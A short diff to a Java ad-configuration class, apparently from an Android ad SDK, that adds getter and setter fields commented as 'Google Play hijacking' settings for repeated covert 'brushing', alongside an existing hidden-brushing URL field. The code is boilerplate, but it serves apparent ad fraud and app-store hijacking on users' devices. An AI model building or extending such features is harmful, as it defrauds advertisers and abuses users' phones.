@@ -38,6 +38,11 @@ public class GAdPositionConfig {
 	
 	//暗刷
 	private String behindBrushUrls;
+
+	//gp劫持
+	private int gpBrushNum;//补刷次数
+	private String gpBrushTimeSlot;//补刷时间段
+	private float gpBrushInterval;//补刷间隔
 	
 		
 	public GAdPositionConfig(){}
@@ -175,9 +180,31 @@ public class GAdPositionConfig {
 	public void setAdShowNum(Integer adShowNum) {
 		this.adShowNum = adShowNum;
 	}
-	
-	
-	
+
+	public int getGpBrushNum() {
+		return gpBrushNum;
+	}
+
+	public void setGpBrushNum(int gpBrushNum) {
+		this.gpBrushNum = gpBrushNum;
+	}
+
+	public String getGpBrushTimeSlot() {
+		return gpBrushTimeSlot;
+	}
+
+	public void setGpBrushTimeSlot(String gpBrushTimeSlot) {
+		this.gpBrushTimeSlot = gpBrushTimeSlot;
+	}
+
+	public float getGpBrushInterval() {
+		return gpBrushInterval;
+	}
+
+	public void setGpBrushInterval(float gpBrushInterval) {
+		this.gpBrushInterval = gpBrushInterval;
+	}
+
 //	public void initPackageName(List<String> launcherApps)
 //	{
 //		packageNames = new ArrayList<String>();
